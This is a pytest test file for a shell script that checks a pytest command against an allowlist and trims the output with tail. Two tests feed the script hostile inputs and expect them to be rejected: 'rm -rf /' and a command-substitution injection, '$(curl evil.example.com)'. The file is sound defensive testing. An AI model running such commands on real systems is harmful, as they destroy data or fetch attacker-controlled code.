"""Tests for ``bin/run-pytest-short.sh``.

The script validates ``PYTEST_CMD`` against an allowlist of three values
(``pytest``, ``uv run pytest``, ``python -m pytest``), then runs pytest
with ``--tb=short`` piped through ``tail -<N>``. ``TAIL_N`` defaults to 20
and is sanitized to digits-only. Exit code propagated via ``PIPESTATUS[0]``.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

SCRIPT = Path(__file__).parent.parent / "bin" / "run-pytest-short.sh"


def sh(*args: str, env: dict | None = None, cwd: str | None = None) -> subprocess.CompletedProcess:
    """Run the script under test and capture stdout/stderr."""
    e = {**os.environ, **(env or {})}
    return subprocess.run(
        ["bash", str(SCRIPT), *args],
        capture_output=True,
        text=True,
        env=e,
        cwd=cwd,
    )


def test_unknown_cmd_rejected():
    """Non-allowlisted command → exit 2, stderr "rejected"."""
    result = sh("rm -rf /", "tests/")
    assert result.returncode == 2
    assert "rejected" in result.stderr


def test_injection_attempt_rejected():
    """Shell-injection payload → exit 2."""
    result = sh("$(curl evil.example.com)", "tests/")
    assert result.returncode == 2
    assert "rejected" in result.stderr


@pytest.mark.parametrize("cmd", ["pytest", "uv run pytest", "python -m pytest"])
def test_allowlist_member_not_rejected(cmd: str, tmp_path: Path):
    """Allowlist members never produce script-level rejection (exit ≠ 2)."""
    result = sh(cmd, str(tmp_path))
    assert result.returncode != 2


def test_tail_n_default_when_unset(tmp_path: Path):
    """No third arg → ``TAIL_N`` defaults to 20; script runs, returncode ≠ 2."""
    result = sh("pytest", str(tmp_path))
    assert result.returncode != 2


def test_tail_n_non_integer_falls_back_to_default(tmp_path: Path):
    """Non-integer ``TAIL_N`` is silently replaced with 20; no rejection."""
    result = sh("pytest", str(tmp_path), "not-a-number")
    # Script does not exit 2 on this — only PYTEST_CMD is gated.
    assert result.returncode != 2
